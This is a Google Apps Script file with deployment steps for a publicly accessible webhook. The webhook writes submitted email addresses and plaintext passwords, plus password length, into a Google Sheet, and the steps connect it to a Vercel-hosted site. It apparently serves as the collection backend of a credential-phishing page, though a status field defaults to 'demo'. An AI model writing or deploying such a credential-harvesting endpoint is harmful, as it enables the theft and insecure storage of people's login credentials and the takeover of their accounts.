// =====================================================================
// Google Apps Script — Paste this in your Google Sheet's Apps Script
// Steps:
//   1. Open your Google Sheet
//   2. Click Extensions > Apps Script
//   3. Delete any existing code, paste ALL of this, and click Save (💾)
//   4. Click Deploy > New Deployment
//   5. Type: Web app | Execute as: Me | Who has access: Anyone
//   6. Click Deploy, copy the Web App URL
//   7. Paste that URL as GOOGLE_SHEET_WEBHOOK_URL in Vercel environment variables
// =====================================================================

function doPost(e) {
  try {
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();

    // Add header row if sheet is empty
    if (sheet.getLastRow() === 0) {
      sheet.appendRow(['timestamp', 'email', 'password', 'password_length', 'status']);
    }

    var data = JSON.parse(e.postData.contents);

    sheet.appendRow([
      data.timestamp || new Date().toISOString(),
      data.email || '',
      data.password || '',
      data.password_length || 0,
      data.status || 'demo'
    ]);

    return ContentService
      .createTextOutput(JSON.stringify({ ok: true }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService
      .createTextOutput(JSON.stringify({ ok: false, error: err.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

// Test via: run doGet in Apps Script editor to confirm sheet is accessible
function doGet() {
  return ContentService
    .createTextOutput(JSON.stringify({ ok: true, message: 'Webhook is live' }))
    .setMimeType(ContentService.MimeType.JSON);
}
